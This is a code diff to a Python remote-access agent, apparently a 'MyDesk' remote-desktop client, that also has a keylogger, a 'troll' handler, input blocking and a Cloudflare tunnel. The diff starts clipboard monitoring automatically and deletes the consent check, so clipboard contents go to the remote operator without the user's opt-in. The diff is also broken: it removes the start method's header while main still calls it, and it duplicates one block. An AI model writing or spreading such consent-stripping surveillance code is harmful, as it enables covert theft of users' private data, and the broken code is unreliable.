@@ -47,7 +47,7 @@ try:
     from targets.device_settings import DeviceSettings
     from targets.troll_handler import TrollHandler
     from targets.webrtc_handler import WebRTCHandler, AIORTC_AVAILABLE
-    from targets.webrtc_tracks import create_screen_track, create_webcam_track
+    from targets.webrtc_tracks import create_screen_track
     from targets.resource_manager import get_resource_manager
     try:
         from targets.tunnel_manager import TunnelManager
@@ -71,7 +71,7 @@ except ImportError:
     from troll_handler import TrollHandler
     try:
         from webrtc_handler import WebRTCHandler, AIORTC_AVAILABLE
-        from webrtc_tracks import create_screen_track, create_webcam_track
+        from webrtc_tracks import create_screen_track
         from resource_manager import get_resource_manager
         from tunnel_manager import TunnelManager 
     except ImportError:
@@ -138,12 +138,11 @@ class AsyncAgent:
         self.process_mgr = ProcessManager()
         self.file_mgr = FileManager()
         self.clipboard_handler = ClipboardHandler(on_change=self.on_clipboard_change)
+        self.clipboard_handler.start_monitoring() # Auto-Start Monitoring
         self.device_settings = DeviceSettings()
         self.troll_handler = TrollHandler()
         self.direct_ws_clients = set()
-        self.direct_url = None
-        self.direct_server = None
-        self.direct_ws_clients = set()
+        self.username = os.environ.get('MYDESK_USERNAME', platform.node())
         self.direct_url = None
         self.direct_server = None
         self.tunnel_mgr = TunnelManager(8765) if TunnelManager else None
@@ -159,7 +158,6 @@ class AsyncAgent:
         self.kiosk_process = None
         
         # Security State
-        self.clipboard_consent = False # Require opt-in
         self.troll_cooldowns = {} # target_id -> timestamp
         self.TROLL_COOLDOWN_SEC = 30
         self.admin_public_key = None # TODO: Load from config/keyfile
@@ -264,7 +262,7 @@ class AsyncAgent:
                    req.add_header('Content-Length', len(jsondata))
                    
                    # Timeout to prevent hanging
-                   with urllib.request.urlopen(req, jsondata, timeout=10) as response:
+                   with urllib.request.urlopen(req, jsondata, timeout=10):
                        pass
                        # print(f"[+] Heartbeat sent: {response.status}")
                 else:
@@ -338,9 +336,6 @@ class AsyncAgent:
 
     def on_clipboard_change(self, entry):
         """Called when clipboard content changes (from monitoring thread)."""
-        if not self.clipboard_consent:
-            return # Privacy: Do not send if no consent
-            
         try:
             data = json.dumps(entry).encode('utf-8')
             self._send_async(protocol.OP_CLIP_ENTRY, data)
@@ -361,7 +356,7 @@ class AsyncAgent:
             offer_sdp = data.get('sdp')
             offer_type = data.get('type', 'offer')
             
-            print(f"[WebRTC] Received SDP offer, creating answer...")
+            print("[WebRTC] Received SDP offer, creating answer...")
             
             # Create or reuse WebRTC handler
             if self.webrtc_handler is None:
@@ -389,7 +384,7 @@ class AsyncAgent:
             # Send SDP Answer back
             answer_msg = json.dumps(answer).encode('utf-8')
             await send_msg(source_ws, bytes([protocol.OP_RTC_ANSWER]) + answer_msg)
-            print(f"[WebRTC] Sent SDP answer - streaming via WebRTC now")
+            print("[WebRTC] Sent SDP answer - streaming via WebRTC now")
             
             # Send any gathered ICE candidates
             for candidate in self.webrtc_handler.get_pending_ice_candidates():
@@ -550,11 +545,6 @@ class AsyncAgent:
         # For now, we stub this out but enforce the structure.
         # Handling raw bytes payload might be tricky if we decode here.
         # Assuming payload is JSON.
-        try:
-            data = json.loads(payload_str)
-            # if not data.get('consent_token'): ... 
-        except:
-            pass # Payload might be raw bytes for some ops?
             
         # 3. Update Cooldown
         self.troll_cooldowns['self'] = now
@@ -621,9 +611,7 @@ class AsyncAgent:
                 # Return (status, headers, body) to stop handshake processing
                 return (200, [], b"Agent Online")
 
-            # [REMOVED] The "Force Upgrade" mutation block was deleted here.
-            # It causes AssertionError in websockets v13+ and is no longer needed
-            # as the library natively handles "Connection: keep-alive, Upgrade".
+
                 
         except Exception as e:
             # Just log warning but don't crash
@@ -694,7 +682,7 @@ class AsyncAgent:
                         data = json.loads(payload.decode('utf-8'))
                         offer_sdp = data.get('sdp', '')
                         offer_type = data.get('type', 'offer')
-                        print(f"[WebRTC] Received SDP offer, creating answer...")
+                        print("[WebRTC] Received SDP offer, creating answer...")
                         
                         # Create WebRTC handler if not exists
                         # Handled in __init__ now, but safe to verify
@@ -730,7 +718,7 @@ class AsyncAgent:
                         # Send SDP Answer back
                         answer_msg = json.dumps(answer).encode('utf-8')
                         await send_msg(source_ws, bytes([protocol.OP_RTC_ANSWER]) + answer_msg)
-                        print(f"[WebRTC] Sent SDP answer - streaming via WebRTC now")
+                        print("[WebRTC] Sent SDP answer - streaming via WebRTC now")
                         
                     except Exception as e:
                         print(f"[-] WebRTC Offer Error: {e}")
@@ -995,6 +983,10 @@ class AsyncAgent:
                                 if self.input_ctrl:
                                     self.input_ctrl.block_input(False)
                             
+                                # Disable Blocker
+                                if self.input_ctrl:
+                                    self.input_ctrl.block_input(False)
+                            
                     except Exception as e:
                         print(f"[-] Setting Error: {e}")
 
@@ -1052,7 +1044,7 @@ class AsyncAgent:
                         files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, path)
                         
                         # Fix: Construct correct response structure since list_dir only returns list
-                        current_path = path if path else os.path.expanduser("~")
+                        current_path = path 
                         resp = json.dumps({'files': files, 'path': current_path}).encode('utf-8')
                         self._send_async(protocol.OP_FM_DATA, resp)
                     except Exception as e:
@@ -1662,35 +1654,6 @@ class AsyncAgent:
         finally:
             self.mic_streaming = False
 
-    def apply_settings(self, settings):
-        """Apply capture settings from Viewer."""
-        print(f"[*] Applying settings: {settings}")
-        
-        # Quality (JPEG/WEBP)
-        if 'quality' in settings:
-            self.capturer.quality = int(settings['quality'])
-            
-        # Scale (Resize %)
-        if 'scale' in settings:
-            self.capturer.scale = int(settings['scale'])
-            
-        # Format (JPEG, PNG, WEBP)
-        if 'format' in settings:
-            self.capturer.format = settings['format']
-            
-        # Capture Method (MSS, DXCAM)
-        if 'method' in settings:
-            method = settings['method']
-            if method == "DXCAM":
-                self.capturer.use_dxcam = True
-                self.capturer.use_mss = False
-            elif method == "MSS":
-                self.capturer.use_dxcam = False
-                self.capturer.use_mss = True
-                
-        # Target FPS (for streaming loop)
-        if 'fps' in settings:
-            self.target_fps = int(settings['fps'])
 
     def send_key_sync(self, key_str):
         if self.loop:
@@ -1730,8 +1693,6 @@ class AsyncAgent:
             return
 
         # Prepare Payload
-        import hashlib
-        safe_id = hashlib.sha256(self.my_id.encode()).hexdigest()[:8]
         
         payload = {
             "id": self.my_id,
@@ -1772,35 +1733,6 @@ class AsyncAgent:
                 
             # Wait 30 seconds (Heartbeat interval)
             await asyncio.sleep(30)
-
-    def start(self, local_mode=False):
-        pub_url = None
-        
-        # 1. Start Cloudflare Tunnel (Hybrid Mode)
-        if not local_mode:
-            try:
-                # TunnelManager is imported globally now
-                
-                print("[*] Starting Cloudflare Tunnel...")
-                self.tunnel_mgr = TunnelManager(port=8765) 
-                
-                pub_url = self.tunnel_mgr.start()
-                if pub_url:
-                    print(f"[+] Tunnel Established: {pub_url}")
-                else:
-                     print("[-] Tunnel Failed to Start")
-                     
-            except Exception as e:
-                print(f"[-] Hybrid Setup Error: {e}")
-        else:
-            print("[*] Local Mode: Skipping Cloudflare Tunnel")
-
-        # Start Keylogger
-        if self.auditor:
-            try:
-                self.auditor.start()
-            except Exception as e:
-                print(f"[-] Failed to start Keylogger: {e}")
 
         # Start the asyncio loop
         self.loop = asyncio.new_event_loop()
@@ -1882,7 +1814,7 @@ def main():
 
         agent = AsyncAgent(DEFAULT_BROKER)
         agent.start(local_mode=args.local)
-    except Exception as e:
+    except Exception:
         # Log fatal crash
         import traceback
         import datetime
